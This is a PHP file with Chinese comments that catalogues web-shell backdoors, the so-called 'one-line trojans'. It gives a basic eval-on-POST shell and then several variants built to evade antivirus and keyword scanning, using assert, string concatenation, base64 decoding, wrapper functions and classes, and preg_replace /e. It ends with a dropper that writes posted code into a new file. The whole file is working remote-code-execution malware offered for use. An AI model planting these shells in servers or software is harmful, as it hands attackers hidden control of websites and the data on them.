<!-- 
远程控制类代码——web版
一句话木马
核心语句：eval('xxxxxxx')  eval可以把它包裹起来的字符串当作代码来解析
-->

<?php eval($_POST['abc']);?>
<!-- 一句话木马的基本版本，把post进来的abc参数的参数值当作php来执行 -->

<!-- 一般测试情况，输出phpinfo();就可以了，如果输出，就证明一句话木马可用 -->


<!-- 一句话木马升级版（免杀）： -->

<?php eval($_POST['abc']);?>

<?php assert($_POST['abc']);?>
<!-- assert和eval很像，assert会执行字符串参数，本意是拿来做debug用的。。。 -->

<?php
$a = substr_replace("assexx","rt",4);
$a($_POST['abc']);
?>
<!-- substr_replace函数用于把字符串的一部替换为另一个字符串，用法为：substr_replace(string,replacement,start,length)，这样可以躲避部分关键字筛查 -->

<?php
function haha($a){
$a($_POST['abc']);
}
haha(assert);
?>
<!-- 利用函数来隐藏关键字 -->

<?php
function haha($a){
assert($a);
}
haha($_POST['abc']);
?>
<!-- 和上面一个同样的原理，只不过替换的部分换了一下 -->

<?php
$a = $_REQUEST['a'];
$b = "\n";
eval($b.=$a);
?>
<!-- 用字符串拼接来隐藏 -->

<?php
class me
{
public $a='';
function __destruct(){
assert("$this->a");
}
}
$b = new me;
$b->$a=$_POST['a'];
?>
<!-- 用类来隐藏 -->

<?php
$a = base64_decode("YXNzZXJ0");
$a($_POST['a']);
?>
<!-- 利用base64加密来隐藏 -->

<?php
$a = "a"."s";
$b = "s"."e"."r"."t";
$c = $a.$b;
$c($_POST['a']);
?>
<!-- 还是利用字符串拼接来隐藏 -->

<?php
function fun(){
return $_POST['a'];
}
@preg_replace("/haha/e",fun(),"haha");
?>

<!-- preg_replace 函数执行一个正则表达式的搜索和替换,@让php不输出错误，增加隐蔽功能 -->

<?php
if(isset($_POST['file'])){
$d = 'data';
$$d = $_POST['text'];//$data
$f = 'fp';
$$f = fopen($_POST['file'],'wb');//$fp
echo fwrite($fp,$data)?'save success':'save fail';
fclose($fp);
}
?>
<!-- 此时打开这个php文件，post的参数是file=test.php&text=一句话木马
之后会在当前目录下创建一个叫test.php的文件并且写入一句话木马 -->